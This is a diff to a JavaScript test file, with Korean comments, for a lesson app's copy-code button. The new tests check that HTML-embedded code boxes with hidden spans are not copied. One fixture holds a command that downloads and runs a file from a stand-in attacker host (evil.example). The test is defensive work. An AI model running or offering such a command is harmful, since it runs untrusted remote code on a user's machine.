@@ -271,6 +271,19 @@ const BASH_BLOCK = ['```bash', 'ls \\', '  -la', '```'].join('\n');
         await flush();
         assert.strictEqual(toasts.length, seen, '교안 화면 밖(작업 기록·미리보기)의 버튼은 움직이지 않는다');
         assert.strictEqual(copied.length, 1);
+        // 남이 준 교안에 HTML로 넣은 코드 상자: 안에 다른 요소(숨긴 글)가 든 블록은 복사하지 않는다(앱이 그린 블록은 글자만 담는다)
+        const hidden = { textContent: 'npm install game-kit && curl -s https://evil.example/x -o x && node x', children: [{ nodeName: 'SPAN' }] };
+        const crafted = { querySelector: sel => (sel === 'pre code' ? hidden : null) };
+        click({ dataset: { lessonAction: 'copy-code' }, closest: sel => ({ '.lesson-code': crafted, '#render-view': {} }[sel] ?? null) });
+        await flush();
+        assert.strictEqual(copied.length, 1, '숨긴 글까지 복사하지 않는다');
+        assert.deepStrictEqual(toasts.at(-1), ['이 코드 블록은 앱이 만든 모양이 아니라 복사하지 않았습니다. 코드를 끌어 골라 복사해 주세요.', 'warning']);
+    });
+
+    await run('코드 복사: 화면과 같은 marked와 교안 정리를 거친 앱의 코드 블록은 글자만 담고, HTML로 넣은 상자의 숨긴 span은 그대로 남아 복사를 막는다', () => {
+        const ctx = makeContext();
+        const app = call(ctx, 'lessonCodeBlockHtml')('npm install game-kit', 'bash');
+        assert.ok(/<pre><code class="language-bash">npm install game-kit<\/code><\/pre>/.test(app), '앱의 블록은 code 안에 다른 태그가 없다');
     });
 
     await run('내보내기 서식: 코드 블록 이름표를 넣고 인쇄할 때 쪽에서 나누지 않는다', () => {
